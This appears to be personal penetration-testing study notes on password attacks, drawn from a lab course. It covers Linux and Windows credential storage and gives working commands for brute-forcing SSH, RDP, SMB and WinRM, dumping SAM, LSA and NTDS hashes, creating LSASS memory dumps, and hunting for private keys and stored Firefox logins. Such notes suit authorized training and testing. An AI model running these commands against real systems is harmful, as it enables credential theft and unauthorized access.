# Password Attacks

---

# —————————————————————————————————————————————————————————

# Credential Storage

## Linux

`/etc/shadow` and is part of the Linux user management system. In addition, these passwords are commonly stored in the form of `hashes`. An example can look like this:

### **Shadow File**

```
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

The `/etc/shadow` file has a unique format in which the entries are entered and saved when new users are created.

|  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| htb-student: | $y$j9T$3QSBB6CbHEu...SNIP...f8Ms: | 18955: | 0: | 99999: | 7: | : | : | : |
| <username>: | <encrypted password>: | <day of last change>: | <min age>: | <max age>: | <warning period>: | <inactivity period>: | <expiration date>: | <reserved field> |

The encryption of the password in this file is formatted as follows:

| $ <id> | $ <salt> | $ <hashed> |
| --- | --- | --- |
| $ y | $ j9T | $ 3QSBB6CbHEu...SNIP...f8Ms |

The type (`id`) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.

- ID examples table
    
    
    | ID | Cryptographic Hash Algorithm |
    | --- | --- |
    | $1$ | https://en.wikipedia.org/wiki/MD5 |
    | $2a$ | https://en.wikipedia.org/wiki/Blowfish_(cipher) |
    | $5$ | https://en.wikipedia.org/wiki/SHA-2 |
    | $6$ | https://en.wikipedia.org/wiki/SHA-2 |
    | $sha1$ | https://en.wikipedia.org/wiki/SHA-1 |
    | $y$ | https://github.com/openwall/yescrypt |
    | $gy$ | https://www.openwall.com/lists/yescrypt/2019/06/30/1 |
    | $7$ | https://en.wikipedia.org/wiki/Scrypt |

However, a few more files belong to the user management system of Linux. The other two files are `/etc/passwd` and `/etc/group`. In the past, the encrypted password was stored together with the username in the `/etc/passwd` file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The `/etc/shadow` file can only be read by the user `root`.

### passw**d File**

```
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

| htb-student: | x: | 1000: | 1000: | ,,,: | /home/htb-student: | /bin/bash |
| --- | --- | --- | --- | --- | --- | --- |
| <username>: | <password>: | <uid>: | <gid>: | <comment>: | <home directory>: | <cmd executed after logging in> |

The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file. However, the redirection to the `/etc/shadow` file does not make the users on the system invulnerable because if the rights of this file are set incorrectly, the file can be manipulated so that the user `root` does not need to type a password to log in. Therefore, an empty field means that we can log in with the username without entering a password.

- [Linux User Auth](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf)
1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted passwords are stored in /etc/shadow files. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
3. **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID (GID)**: The primary group ID (stored in /etc/group file)
5. **User ID Info (GECOS)**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell

---

### **Opasswd**

The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the `/etc/security/opasswd`. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

### **Reading /etc/security/opasswd**

Reading /etc/security/opasswd

```
sudo cat /etc/security/opasswd
cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Looking at the contents of this file, we can see that it contains several entries for the user `cry0l1t3`, separated by a comma (`,`). Another critical point to pay attention to is the hashing type that has been used. This is because the `MD5` (`$1$`) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.

## Windows Authentication Process

### Windows Authentication diagram

The [Windows client authentication process](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) can oftentimes be more complicated than with Linux systems and consists of many different modules that perform the entire logon, retrieval, and verification processes. In addition, there are many different and complex authentication procedures on the Windows system, such as Kerberos authentication. The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (`SIDs`).

![Untitled](Password%20Attacks%200899fa06ab2c406f9afa4fae4b6cf65b/Untitled.png)

### Winlogon

Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a username and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.

Each interactive logon session creates a separate instance of the Winlogon service. The [Graphical Identification and Authentication](https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) (`GINA`) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the [LSALogonUser](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.

### **LSASS**

[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the `Event log`. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN).

### **SAM Database**

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an `LM` hash or an `NTLM` hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\ntds.dit`.

Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the `SYSKEY` (`syskey.exe`) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.

### **Credential Manager**

![https://academy.hackthebox.com/storage/modules/147/authn_credman_credprov.png](https://academy.hackthebox.com/storage/modules/147/authn_credman_credprov.png)

Source: [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication).

Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's `Credential Locker`. Credentials are encrypted and stored at the following location:

Credential Manager

```powershell
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\

```

There are various methods to decrypt credentials saved using Credential Manager.

### **NTDS**

the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

---

# —————————————————————————————————————————————————————————

# Attack Methods

### 1. Password Guessing

- Guessing a password requires some knowledge of the target, such as their pet’s name and birth year.

### 2. Rainbow Table (Hash lookup attack)

- have to many passwords and it then compares it with the hashed password
- cons:
    - can't crack the password with salt
    - try all hashing algorithms so it takes time and resources

### 3. Dictionary Attack

- This approach expands on password guessing and attempts to include all valid words in a dictionary or a wordlist.

### 4. Brute-Force Attack

- This attack is the most exhaustive and time-consuming where an attacker can go as far as trying all possible character combinations, which grows fast (exponential growth with the number of characters).

### 5. Custom Attack

---

- In summary, attacks against login systems can be carried out efficiently using a tool, such as THC Hydra combined with a suitable word list. Mitigation against such attacks can be sophisticated and depends on the target system. A few of the approaches include:
    - Password Policy: Enforces minimum complexity constraints on the passwords set by the user.
    - Account Lockout: Locks the account after a certain number of failed attempts.
    - Throttling Authentication Attempts: Delays the response to a login attempt. A couple of seconds of delay is tolerable for someone who knows the password, but they can severely hinder automated tools.
    - Using CAPTCHA: Requires solving a question difficult for machines. It works well if the login page is via a graphical user interface (GUI). (Note that CAPTCHA stands for Completely Automated Public Turing Test to tell Computers and Humans Apart.)
    - Requiring the use of a public certificate for authentication. This approach works well with SSH, for instance.
    - Two-Factor Authentication: Ask the user to provide a code available via other means, such as email, smartphone app or SMS.
    - There are many other approaches that are more sophisticated or might require some established knowledge about the user, such as IP-based geolocation.

---

# —————————————————————————————————————————————————————————

# Network Services

## [WinRM](https://www.notion.so/WinRM-b14966b622404aca8460e6353f9c2cbf?pvs=21)

A handy tool that we can use for our password attacks is [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the [official documentation](https://mpgn.gitbook.io/crackmapexec/) for this tool to become familiar with it.

### brute-force using [CrackMapExec](https://www.notion.so/CrackMapExec-ebf83da030bc4e13994dda977ff6dc22?pvs=21)

```bash
crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

### interact using Evil-WinRM

```bash
evil-winrm -i $ip -u $username -p $password
```

If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

## [SSH](https://www.notion.so/SSH-90501ba64a0e4697a9e2bc94062174f1?pvs=21)

```bash
hydra -L $usernames -P $passwords ssh://$ip
```

## [RDP](https://www.notion.so/RDP-d517a684a68d4b03aacc9611f19096ea?pvs=21)

```bash
hydra -L $usernames -P $passwords rdp://$ip
```

## [SMB](https://www.notion.so/SMB-f56764d7140d45aebbea731b97281492?pvs=21)

### brute-force Using Hydra

```bash
hydra -L $usernames -P $passwords smb://$ip
```

### Hydra Error

```bash
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

### Using Metasploit

```bash
use auxiliary/scanner/smb/smb_login
```

## Using CrackMapExec

```bash
crackmapexec smb $ip -u $usernames -p $passwords 
```

### CrackMapExec → show shares

```bash
crackmapexec smb $ip -u $username -p $password --shares
```

---

# —————————————————————————————————————————————————————————

# Default Passwords / Password Reuse

https://github.com/ihebski/DefaultCreds-cheat-sheet is a great tool for default passwords

---

# —————————————————————————————————————————————————————————

# Windows Password Attacks

# ⇒ **Attacking SAM**

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

| Registry Hive | Description |
| --- | --- |
| hklm\sam | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| hklm\system | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |
| hklm\security | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |

We can create backups of these hives using the `reg.exe` utility.

[https://www.notion.so/juba-notes/Windows-Privilege-Escalation-035f0b2030e3444e92aebd694e84d9a8?pvs=4#8178a8170d0841b188b5e2519f828e44](https://www.notion.so/Windows-Privilege-Escalation-035f0b2030e3444e92aebd694e84d9a8?pvs=21) integrate this

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam $samdb -security $securitydb -system $systemdb LOCAL
```

```bash
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

## →**Remote Dumping SAM**

```bash
crackmapexec smb $ip --local-auth -u $username -p $password --sam
```

## → Remote Dumping **LSA Secrets Considerations**

```bash
crackmapexec smb $ip --local-auth -u $username -p $password --lsa
```

# ⇒ Attack LSASS

Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump.

## → Dump LSASS Process via Task Manager (GUI)

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

## →Dump LSASS Process via **`Rundll32.exe` & `Comsvcs.dll`**

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

1. get LSASS PID
    - using CMD → tasklist
        
        ```bash
        tasklist /svc
        ```
        
    - using PowerShell → Get-Process
    
    ```powershell
    Get-Process lsass
    ```
    
2. dump LSASS process
    
    ```powershell
    rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
    ```
    

## → Extract Credentials using `pypykatz`

- info
    
    Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.
    

```powershell
pypykatz lsa minidump $LSASS_dump
```

We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file.

**Lets take a more detailed look at some of the useful information in the output.**

## → **MSV**

```
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA

```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.

## → **WDIGEST**

```
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

```

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update [here](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

## → **DPAPI**

```
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

```

The Data Protection Application Programming Interface or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:

| Applications | Use of DPAPI |
| --- | --- |
| Internet Explorer | Password form auto-completion data (username and password for saved sites). |
| Google Chrome | Password form auto-completion data (username and password for saved sites). |
| Outlook | Passwords for email accounts. |
| Remote Desktop Connection | Saved credentials for connections to remote machines. |
| Credential Manager | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |

Mimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) module.

# ⇒ Attacking Active Directory & NTDS.dit

Once a Windows system is joined to a domain, it will **no longer default to referencing the SAM database to validate logon requests**.

## → Dictionary attacks using CrackMapExec

```bash
crackmapexec smb $DC_IP -u $username -p $passwords
```

## → Capturing NTDS.dit

### Fast way using CrackMapExec

```bash
crackmapexec smb $ip -u $username -p $password --ntds
```

### Manually using `vssadmin` or `wmic`

- check Local Group Membership

```bash
net localgroup
```

we have to be in “Administrators” or “Domain Admins” or equivalent rights group to capture NTDS.dit

- **Creating Shadow Copy of C: using vssadmin**

```bash
vssadmin CREATE SHADOW /For:C
```

- this command may not work on some windows hosts like HOME edition or when VSS is not enabled
- **Creating Shadow Copy of C: using wmic**

```bash
wmic shadowcopy call create Volume='C:\'
```

- copy NTDS.dit

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\TEMP
```

<aside>
💡 we can crack the hashes we found or we can Pass-The-Hash [ [=] Pass The Hash (PtH)](https://www.notion.so/Pass-The-Hash-PtH-0592e14203954ddb97aabadcf5286fae?pvs=21)

</aside>

# ⇒ Credential Hunting in Windows

## → **Key Terms to Search**

Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:

|  |  |  |
| --- | --- | --- |
| Passwords | Passphrases | Keys |
| Username | User account | Creds |
| Users | Passkeys | Passphrases |
| configuration | dbcredential | dbpassword |
| pwd | Login | Credentials |

## → `LaZagne`

We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store.

```bash
.\lazagne.exe all
```

| Wifi | Wpa_supplicant | Libsecret | Kwallet |
| --- | --- | --- | --- |
| Chromium-based | CLI | Mozilla | Thunderbird |
| Git | Env_variable | Grub | Fstab |
| AWS | Filezilla | Gftp | SSH |
| Apache | Shadow | Docker | KeePass |
| Mimipy | Sessions | Keyrings |  |

## → `findstr`

```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

---

# —————————————————————————————————————————————————————————

# Linux Local Password Attacks

# ⇒ Credential Hunting in Linux

| Files | History | Memory | Key-Rings |
| --- | --- | --- | --- |
| Configs | Logs | Cache | Browser stored credentials |
| Databases | Command-line History | In-memory Processing |  |
| Notes |  |  |  |
| Scripts |  |  |  |
| Source codes |  |  |  |
| Cronjobs |  |  |  |
| SSH Keys |  |  |  |

## → Configuration Files

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

## → Databases

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

## → text files & no extension

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

## → script

```bash
for ext in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

## → ssh private keys

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

## → ssh public keys

```bash
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

## → Bash History

```bash
tail -n5 /home/*/.bash*
```

## → Logs

| Application Logs | Event Logs | Service Logs | System Logs |
| --- | --- | --- | --- |

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

| Log File | Description |
| --- | --- |
| /var/log/messages | Generic system activity logs. |
| /var/log/syslog | Generic system activity logs. |
| /var/log/auth.log | (Debian) All authentication related logs. |
| /var/log/secure | (RedHat/CentOS) All authentication related logs. |
| /var/log/boot.log | Booting information. |
| /var/log/dmesg | Hardware and drivers related information and logs. |
| /var/log/kern.log | Kernel related warnings, errors and logs. |
| /var/log/faillog | Failed login attempts. |
| /var/log/cron | Information related to cron jobs. |
| /var/log/mail.log | All mail server related logs. |
| /var/log/httpd | All Apache related logs. |
| /var/log/mysqld.log | All MySQL server related logs. |

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

## → **Memory and Cache (root priv. required)**

### `mimipenguin`

```bash
sudo python3 mimipenguin.py
```

### [→ `LaZagne`](Password%20Attacks%200899fa06ab2c406f9afa4fae4b6cf65b.md)

```python
sudo python2.7 laZagne.py all
```

## → Browsers

### find **Firefox Stored Credentials**

```python
ls -l .mozilla/firefox/ | grep default
```

```python
for dir in `ls .mozilla/firefox/ | grep default `; do cat ".mozilla/firefox/$dir/logins.json"; done
```

### decrypt firefox credentials (https://github.com/unode/firefox_decrypt)

# —————————————————————————————————————————————————————————

# Windows Lateral Movement

# ⇒ Pass the Hash (PtH)

## Dumping Hashes from

### SAM

### NTDS

### `lsass.exe` memory

# —————————————————————————————————————————————————————————

# Tools

### ⇒ [Hydra](https://www.notion.so/Hydra-aa94b736d7764d51825d146195138c92?pvs=21)

### ⇒ [John](https://www.notion.so/JohnTheRipper-JTR-bd24d16e88444e858c9047fcc97a852b?pvs=21)

### ⇒ [`medusa`](https://www.notion.so/Medusa-307a5692e5ca4128b69dbb5b575e646f?pvs=21)

## ⇒ Custom Wordlist generators

### → `cewl`

```bash
cewl $url -d $depth -m $min_length  -w $output_wordlist # password custom generator tool
```

### → cupp: Common User Password Profiler

```bash
cupp -i
```

### → TTPassGen

[TTPassGen-1.1.2.zip](Password%20Attacks%200899fa06ab2c406f9afa4fae4b6cf65b/TTPassGen-1.1.2.zip)

### → Lyricspass

[lyricpass.py](Password%20Attacks%200899fa06ab2c406f9afa4fae4b6cf65b/lyricpass.py)

### → Crunch

```bash
crunch $minimum_length $maximum_length [$charset] [-t $pattern] [-o $output_file]
```

The pattern can contain "`@`," representing lower case characters, "`,`" (comma) will insert upper case characters, "`%`" will insert numbers, and "`^`" will insert symbols.

### → **Kwprocessor**

- introduction
    
    `Kwprocessor` is a tool that creates wordlists with keyboard walks. Another common password generation technique is to follow patterns on the keyboard. These passwords are called keyboard walks, as they look like a walk along the keys. For example, the string "`qwertyasdfg`" is created by using the first five characters from the keyboard's first two rows. This seems complex to the normal eye but can be easily predicted. `Kwprocessor` uses various algorithms to guess patterns such as these.
    
    The tool can be found [here](https://github.com/hashcat/kwprocessor) and has to be installed manually.
    
- `install.sh`
    
    ```bash
    git clone https://github.com/hashcat/kwprocessor
    cd kwprocessor
    make
    ```
    

```bash
kwp -s 1 basechars/full.base keymaps/en-us.keymap  routes/2-to-10-max-3-direction-changes.route
```

The command above generates words with characters reachable while holding shift (`-s`), using the full base, the standard en-us keymap, and 3 direction changes route.

### → **Princeprocessor**

`PRINCE` or `PRobability INfinite Chained Elements` is an efficient password guessing algorithm to improve password cracking rates. [Princeprocessor](https://github.com/hashcat/princeprocessor) is a tool that generates passwords using the PRINCE algorithm. The program takes in a wordlist and creates chains of words taken from this wordlist.

- example
    
    ### **Wordlist**
    
    Wordlist
    
    ```
    dog
    cat
    ball
    
    ```
    
    The generated wordlist would be of the form:
    
    ### **Princeprocessor - Generated Wordlist**
    
    Princeprocessor - Generated Wordlist
    
    ```
    dog
    cat
    ball
    dogdog
    catdog
    dogcat
    catcat
    dogball
    catball
    balldog
    ballcat
    ballball
    dogdogdog
    catdogdog
    dogcatdog
    catcatdog
    dogdogcat
    <SNIP>
    
    ```
    
    The `PRINCE` algorithm considers various permutation and combinations while creating each word.
    
- `install.sh`
    
    ```bash
    wget https://github.com/hashcat/princeprocessor/releases/download/v0.22/princeprocessor-0.22.7z
    7z x princeprocessor-0.22.7z
    cd princeprocessor-0.22
    ./pp64.bin -h
    ```
    

```bash
./pp64.bin -o wordlist.txt < words
232
```

According to princeprocessor, 232 unique words can be formed from our wordlist above.

```bash
./pp64.bin --pw-min=10 --pw-max=25 -o wordlist.txt < words
```

### → [username-anarchy](https://github.com/urbanadventurer/username-anarchy)

we can use username-anarchy to create a username wordlist for AD environment where the company usernames follow a specific naming convention like JDoe 

## Mangling

### Mentalist

[Mentalist](../../../../Network%20Penetration%20Testing%207bc0c24ad8fe484d8df2696d10985222/Tools%20a930c6d7503c441a899f087ac5ac019b/Hashcat%20d0ad5f60365e4546bb6ab94d4e1e2ce1/Mentalist.txt)

### RSMangler

[https://github.com/digininja/RSMangler](https://github.com/digininja/RSMangler)

---

## `hashid`

```bash
hashid <hash file>
```

## `hash-identifier`

---

## Salt hash: SALTpassword

## Peppers hash : passwordC → one character

---

## Windows

- LSA (Local Security Authority)
    - is a process in Microsoft Windows that verifies logon attempts, password changes, creates access tokens, and other important tasks relating to Windows authentication and authorization protocols.
- Windows passwords saved in SAM file(Security Account Manager) in `C:\\Windows\\System32\\config\\SAM` you can't do anything with the file while the system is running
you can find the password in `HKEY_LOCAL_MACHINE\\SAM`

### hashes

- **LM** - **(Does not use SALT)** (32 chars) The LM hash is used for storing passwords. It is disabled in W7 and above. However, **LM is enabled in memory if the password is less than 15 characters. That's why all recommendations for admin accounts are 15+ chars. LM is old, based on MD4 and easy to crack**. The reason is that Windows domains require speed, but that also makes for shit security.
    - hashing steps:
        - convert all characters to uppercase
        - complete all the 14 characters with null bytes (\x00)
        - split the password into two 7 bytes halves
        - these values are used to create two DES keys(56bit)
- **NT** - The NT hash calculates the hash based on the entire password the user entered. The LM hash splits the password into two 7-character chunks, padding as necessary.
- **NTLM** - The NTLM hash is used for local authentication on hosts in the domain. It is a combination of the LM and NT hash as seen above. **(Does not use SALT) NTLM Authentication ‣**
- **NetNTLMv1/2** - Hash for authentication on the network (SMB). Sometimes called NTLMv2, but don't get confused; it is not the same as an NTLM hash.

---

‣